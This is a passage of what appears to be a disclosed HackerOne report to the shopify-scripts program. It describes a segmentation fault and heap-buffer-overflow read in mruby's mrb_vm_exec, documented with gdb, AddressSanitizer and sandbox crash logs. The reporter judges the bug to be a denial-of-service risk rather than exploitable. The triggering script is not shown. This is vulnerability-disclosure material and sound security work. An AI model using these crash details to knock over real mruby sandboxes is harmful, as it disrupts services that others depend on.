test_mrb_vm_exec_1678.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n\t1681\t        irep = proc->body.irep;\n\t(gdb) info reg\n\trax            0x0\t0\n\trbx            0x6b9520\t7050528\n\trcx            0x70d380\t7394176\n\trdx            0x6bfe20\t7077408\n\trsi            0x6b4710\t7030544\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffdb70\t0x7fffffffdb70\n\trsp            0x7fffffffd5f0\t0x7fffffffd5f0\n\tr8             0x0\t0\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x7ffff7acd7b8\t140737348687800\n\tr11            0x7ffff7895701\t140737346361089\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x42707c\t0x42707c <mrb_vm_exec+15826>\n\teflags         0x10217\t[ CF PF AF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1676\t          return v;\n\t1677\t        }\n\t1678\t        pc = ci->pc;\n\t1679\t        DEBUG(printf(\"from :%s\\n\", mrb_sym2name(mrb, ci->mid)));\n\t1680\t        proc = mrb->c->ci->proc;\n\t1681\t        irep = proc->body.irep;\n\t1682\t        pool = irep->pool;\n\t1683\t        syms = irep->syms;\n\t1684\t\n\t1685\t        regs[acc] = v;\n\n\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n\t#1  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#2  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490\n\t#3  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#4  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n\t#5  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\n\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_vm_exec_1681.rb \n\t=================================================================\n\t==2434==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005e3e0f bp 0x7fff596043b0 sp 0x7fff596043a8\n\tREAD of size 4 at 0x61e00000f050 thread T0\n\t\t#0 0x5e3e0e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38\n\t\t#1 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#2 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12\n\t\t#3 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n\t\t#4 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n\t\t#5 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n\t\t#6 0x7f3c733e1ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#7 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)\n\nSandbox\n-------------------\n\nAttached as sandbox.log.\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1678.rb \n\t./sandbox:20: [BUG] Segmentation fault at 0x00000000000018\n\truby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n\t-- Control frame information -----------------------------------------------\n\tc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n\tc:0002 p:0186 s:0005 E:0002b8 EVAL   ./sandbox:20 [FINISH]\n\tc:0001 p:0000 s:0002 E:0000a0 TOP    [FINISH]\n\n\t-- Ruby level backtrace information ----------------------------------------\n\t./sandbox:20:in `<main>'\n\t./sandbox:20:in `sandbox_eval'\n\n\t-- Machine register context ------------------------------------------------\n\t RIP: 0x00007f35da30b310 RBP: 0x00007f35d8e84f80 RSP: 0x00007f35d8e709e0\n\t RAX: 0x00007f35d8e84b20 RBX: 0x0000000000000000 RCX: 0x0000000000000000\n\t RDX: 0x0000000000000002 RDI: 0x00007f35d8e724e0 RSI: 0x00007f35d8ed1bac\n\t  R8: 0x00007f35d8e84b20  R9: 0x0000000000000002 R10: 0x0000000000000074\n\t R11: 0x0000000000000000 R12: 0x0000000000000000 R13: 0x00007f35d8e724e0\n\t R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010217\n\n\t-- C level backtrace information -------------------------------------------\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eed55]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eef8c]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de8cb06b]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de98114e]\n\t/lib/x86_64-linux-gnu/libc.so.6 [0x7f35de4cbff0]\n\t/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0xae0) [0x7f35da30b310] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1680\n\t/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f35da3112ec] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n\t/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f35da2e4f0e] ../../../../ext/mruby_engine/eval_monitored.c:68\n\t/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f35de27f182] pthread_create.c:312\n\t/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f35de59030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\t...\n\t...\n\t...\n\t7f35deefc000-7f35deefd000 rw-p 00023000 08:01 397412                     /lib/x86_64-linux-gnu/ld-2.19.so\n\t7f35deefd000-7f35deefe000 rw-p 00000000 00:00 0 \n\t7fffc731d000-7fffc7b1c000 rw-p 00000000 00:00 0                          [stack]\n\t7fffc7bfe000-7fffc7c00000 r-xp 00000000 00:00 0                          [vdso]\n\tffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n\t[NOTE]\n\tYou may have encountered a bug in the Ruby interpreter or extension libraries.\n\tBug reports are welcome.\n\tFor details: http://www.ruby-lang.org/bugreport.html\n\n\tAborted (core dumped)\n\nImpact\n-------------------\n\nAs far as I can see, it is not exploitable. But it can cause DoS.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mruby.science", 
            "about": "", 
            "twitter_handle": "", 
            "name": "shopify-scripts"
        }, 
        "handle": "shopify-scripts", 
        "url": "https://hackerone.com/shopify-scripts", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 15668, 
        "default_currency": "usd"
    }, 
    "is_published": false
}